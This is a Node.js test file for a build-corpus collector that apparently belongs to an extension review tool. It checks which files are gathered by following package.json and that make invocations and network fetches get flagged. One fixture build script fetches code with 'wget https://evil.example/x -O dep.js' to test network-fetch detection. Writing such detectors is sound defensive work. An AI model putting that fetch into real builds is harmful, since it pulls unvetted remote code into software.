// selectBuildCorpus COLLECTS the build files to send undeclared-build-source by following
// package.json (an allowlist) - like manifest->reachable in the normal review. A file is
// collected only because the build references it, so build OUTPUT (dist/, a committed .xpi),
// docs, and tooling the build never runs are never collected. It also flags the two steps
// it cannot statically bound: an opaque orchestrator (make) and a network fetch.

import { test } from "node:test";
import assert from "node:assert/strict";

import { selectBuildCorpus } from "../../src/build/corpus.js";

const build = (obj) => ({
  files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
});
const corpusOf = (o) => selectBuildCorpus(build(o)).corpus.sort();

test("collects by following package.json; ignores output/docs/lock/unreferenced", () => {
  const c = corpusOf({
    "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
    "webpack.config.cjs": "module.exports={}",
    "package-lock.json": "{}",
    "dist/bundle.js": "OUTPUT",
    "README.md": "docs",
    "renovate.json": "{}",
    "vite.config.ts": "unused tool config",
  });
  assert.deepEqual(c, ["package.json", "webpack.config.cjs"]);
});

test("seeds package.json + every .npmrc", () => {
  const c = corpusOf({
    "package.json": "{}",
    ".npmrc": "save-exact=true",
    "sub/.npmrc": "x",
  });
  assert.deepEqual(c, [".npmrc", "package.json", "sub/.npmrc"]);
});

test("recognizes a tool invoked INSIDE a followed shell script", () => {
  // build.sh runs `npx webpack` - webpack.config is auto-discovered by name, never
  // textually referenced, yet must be collected.
  const c = corpusOf({
    "package.json": JSON.stringify({
      scripts: { build: "./scripts/build.sh" },
    }),
    "scripts/build.sh": "#!/bin/bash\nnpx webpack --mode=production\n",
    "webpack.config.cjs": "module.exports={}",
  });
  assert.ok(c.includes("scripts/build.sh"));
  assert.ok(
    c.includes("webpack.config.cjs"),
    "tool recognized inside the shell"
  );
});

test("recognizes the WebExtension frameworks wxt and web-ext", () => {
  const wxt = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({ scripts: { build: "wxt build" } }),
      "wxt.config.ts": "export default {}",
    })
  );
  assert.ok(
    wxt.resolved.includes("wxt") && wxt.corpus.includes("wxt.config.ts")
  );
  const webext = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({ scripts: { build: "web-ext build" } }),
      "web-ext-config.js": "module.exports={}",
    })
  );
  assert.ok(webext.corpus.includes("web-ext-config.js"));
});

test("a named archive OUTPUT (a zip target) is never collected", () => {
  const c = corpusOf({
    "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
    "b.sh": "zip -r addon.xpi dist/\n",
    "addon.xpi": "BINARY",
  });
  assert.ok(c.includes("b.sh"));
  assert.ok(
    !c.includes("addon.xpi"),
    "the .xpi output is binary, never collected"
  );
});

test("an unreferenced sibling script is not collected", () => {
  const c = corpusOf({
    "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
    "webpack.config.js": "module.exports={}",
    "scripts/manual-tool.sh": "wget https://x/y",
  });
  assert.ok(!c.includes("scripts/manual-tool.sh"));
});

test("ordinary npm CLIs (lint/test/clean) are not flagged", () => {
  const r = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({
        scripts: {
          build: "rollup -c",
          lint: "eslint .",
          test: "jest",
          clean: "rimraf dist",
        },
      }),
      "rollup.config.js": "export default {}",
    })
  );
  assert.equal(r.unresolved.length, 0);
});

test("flags an opaque orchestrator (make) and a network fetch", () => {
  const mk = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({ scripts: { build: "make dist" } }),
    })
  );
  assert.ok(
    mk.unresolved.some((u) => u.kind === "tool" && u.detail === "make")
  );

  const net = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
      "b.sh": "wget https://evil.example/x -O dep.js\nnpx webpack",
    })
  );
  assert.ok(net.unresolved.some((u) => u.kind === "network"));
});

test("no package.json -> nothing collected", () => {
  assert.deepEqual(
    corpusOf({ Makefile: "all:\n\tgcc", "build.sh": "echo" }),
    []
  );
});

test("a missing referenced file is silently ignored", () => {
  const r = selectBuildCorpus(
    build({
      "package.json": JSON.stringify({
        scripts: { build: "node scripts/build.js" },
      }),
    })
  );
  assert.equal(r.unresolved.length, 0);
  assert.deepEqual(r.corpus, ["package.json"]);
});
